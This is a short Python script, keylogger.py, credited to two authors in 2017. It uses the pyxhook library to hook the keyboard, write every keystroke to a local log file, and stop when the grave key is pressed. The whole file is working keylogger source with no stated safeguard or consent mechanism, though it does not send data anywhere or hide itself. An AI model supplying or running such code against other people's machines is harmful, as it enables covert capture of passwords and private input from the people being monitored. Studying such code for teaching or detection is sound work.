#!/usr/bin/env python
#  =================================================================
#  	SOURCE FILE: keylogger.py
#  
#
#	DATE: Dec 4th 2017
#  
#  
#  	AUTHOR: Paul Cabanez, Justin Chau
#
#	
#	DESCRIPTION: keylogger script to track key strokes
#	
#
#	LAST REVISED: Dec 8th 2017
#  =================================================================

import pyxhook
#change this to your log file's path
log_file='key.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
